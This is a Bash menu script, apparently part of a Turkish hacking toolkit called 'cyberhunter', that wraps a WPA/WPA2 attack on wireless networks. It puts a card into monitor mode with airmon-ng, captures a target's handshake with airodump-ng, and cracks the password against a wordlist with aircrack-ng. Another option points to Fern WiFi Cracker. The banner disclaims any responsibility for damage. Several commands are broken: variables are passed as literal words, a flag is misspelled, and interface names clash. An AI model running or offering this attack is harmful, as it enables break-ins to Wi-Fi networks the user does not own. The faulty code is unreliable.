#!/bin/bash

banner() {
clear
printf "\n"
printf "\n"
printf "\e[1;77m +-+ +-+ +-+ +-+ +-+ +-+ +-+ +-+   +-+ +-+   +-+ +-+ +-+ +-+ +-+ +-+ +-+ +-+ +-+ +-+ +-+\e[0m\n"
printf "\e[1;77m |K| |A| |B| |L| |O| |S| |U| |Z|   |A| |G|   |S| |A| |L| |D| |I| |R| |I| |L| |A| |R| |I|\e[0m\n"
printf "\e[1;77m +-+ +-+ +-+ +-+ +-+ +-+ +-+ +-+   +-+ +-+   +-+ +-+ +-+ +-+ +-+ +-+ +-+ +-+ +-+ +-+ +-+\e[0m\n"
printf "\n"
printf "\e[1;93m       .:\e[0m\e[1;77m Cyber Security Tool coded by:  𝑪 𝒆 𝒚 𝒔 \e[0m\e[1;93m:.\e[0m\n"
printf "\n"
printf "  \e[101m\e[1;77m::   Kablosuz Ağlara Yönelik Saldırı Araçlarının Bulunduğu kısımdır!         ::\e[0m\n"
printf "  \e[101m\e[1;77m::         Geliştirici herhangi bir zarardan sorumlu değildir!               ::\e[0m\n"
printf "\n"  
printf "\n" 

}

menu(){ # Ana Menü Görünümü ve Seçenekler
printf " \e[101m\e[1;77m														\e[0m\n"
printf "\e[	1;92m[\e[0m\e[1;77m00\e[0m\e[1;92m]\e[0m\e[1;93m 	GERİ(Bir Önceki Menüye Döner) \n"
printf "\e[	1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m 	WPA/WPA2 Ağlarına Yönelik Saldırılar \n"
printf "\e[	1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m 	Wifite ile Kolay Wireless Atakları \n"
printf "\e[	1;92m[\e[0m\e[1;77mB \e[0m\e[1;92m]\e[0m\e[1;93m 	Araçlar hakkında bilgi alma  \n"
printf "\e[	1;92m[\e[0m\e[1;77m99\e[0m\e[1;92m]\e[0m\e[1;93m 	ÇIKIŞ \n"
printf " \e[101m\e[1;77m														\e[0m\n"
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Bir Seçenek Seçiniz! \e[0m\en' option

#seçimler

if [[ $option == 99 ]]; then

exit 1


elif [[ $option == 0 || $option == 00 ]]; then
cd $HOME/cyberhunter/
clear
bash cyberhunter.sh

#wpa/wpa2
#sudo apt-get install build-essential autoconf automake libtool pkg-config libnl-3-dev libnl-genl-3-dev libssl-dev ethtool shtool rfkill zlib1g-dev libpcap-dev libsqlite3-dev libpcre3-dev libhwloc-dev libcmocka-dev hostapd wpasupplicant tcpdump screen iw usbutils
elif [[ $option == 1 || $option == 01 ]]; then
airmon-ng
airmon-ng start wlan0
airodump-ng mon0
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Bir BSSID Numarası giriniz! \e[0m\en' bssidno
airodump-ng -c 1 -w handadi -bssid bssidno
printf "\e[1;93m [!] Paket Toplama işleminin yeterli olduğunu düşündüğünüzde CTRL+C tuşu ile sonlandırın. (Önerilen 5-10 dk arası) \e[0m\n"
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Bir wordlist yolunu belirtin!(ÖRN: /root/Masaüstü/wordlist.txt) \e[0m\en' dosya
aircrack-ng -w dosya handadi.cap

#fernwificracker
elif [[ $option == 2 || $option == 02 ]]; then
printf "\e[1;93m [!] Arama çubuğuna fern wifi cracker yazarak görsel olarak başlatın! \e[0m\n"

#bilgi
elif [[ $option == 'b' || $option == 'B' ]]; then
cd $HOME/cyberhunter/pages/06kablosuz_aglara_yonelik_saldirilar
gedit bilgi
clear


else 
printf "\e[1;93m [!] Yanlış bir seçenek seçtiniz. Lütfen tekrar deneyiniz! \e[0m\n"

sleep 1
clear
banner
menu
fi

}
banner
menu

